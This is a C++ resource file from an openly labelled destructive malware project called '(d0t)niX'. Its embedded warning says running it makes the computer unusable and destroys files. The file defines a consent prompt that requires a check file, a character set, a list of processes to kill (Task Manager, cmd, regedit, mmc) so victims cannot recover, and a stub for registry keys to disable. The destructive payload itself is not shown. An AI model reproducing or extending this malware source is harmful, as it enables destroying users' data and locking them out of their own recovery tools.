/*-----------------------------------------------------+-----------------------------\
 |    ___    __________   __  ___          ______  ___ | __________      ________    |
 |   /  / __| _/\   _  \_/  |_\  \   ____ |__\   \/  / | \______   \_____\______ \   |
 |  /  / / __ | /  /_\  \   __\\  \ /    \|  |\     /  |  |       _/  ___/|    |  \  |
 | (  ( / /_/ | \  \_/   \  |   )  )   |  \  |/     \  |  |    |   \___ \ |    `   \ |
 |  \  \\____ |  \_____  /__|  /  /|___|  /__/___/\  \ |  |____|_  /___  >_______  / |
 |   \__\    \/        \/     /__/      \/         \_/ |         \/    \/        \/  |
 +-----------------------------------------+-----------+-----------------------------/
 | ResData.cpp :: (d0t)niX's Resource Data |
 \-----------------------------------------*/

#include "../../Header-Files/pch.h"
#include "../../Header-Files/(d0t)niX.h"

LPCWSTR lpszWarningMSG = {
	L"The Software you're trying to execute is considered Malware !\n\n"
	L"Running this Malware will result in your Computer being unusable "
	L"and your Files irreparably damaged/destroyed.\n\n"
	L"If you're seeing this Message without knowing what you just executed, simply press NO and nothing will happen.\n"
	L"If you know what you're doing create a File with the following name in the Directory of the Binary and press YES to continue.\n\n"
	L"Check-FileName: \"%s\" (8 Digits / No Extension)\n\n"
	L"? DO YOU WANT TO EXECUTE THIS MALWARE ?\n! THERE IS NO GOING BACK AFTERWARDS !\n\n"
//	L"(The Creator of this Malware is not responsible for any harm/damage done using/utilizing this Malware)"
};

WCHAR szCd[MAX_PATH];
WCHAR szMfn[MAX_PATH];

const WCHAR szCharSet[] = {
	L"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
	L"abcdefghijklmnopqrstuvwxyz"
	L"1234567890"
};
const SIZE_T cculCharSet = (sizeof(szCharSet) - 2) / 2;

LPCWSTR lpszKillProcs[] = {
	L"taskmgr.exe",
	L"cmd.exe",
	L"regedit.exe",
	L"mmc.exe"
};
const SIZE_T cculKillProcs = sizeof(lpszKillProcs) / sizeof(LPCWSTR);

const REGLOAD rlDisableKeys[] = {
	_REGLOAD()
};
const SIZE_T cculDisableKeys = sizeof(rlDisableKeys) / sizeof(REGLOAD);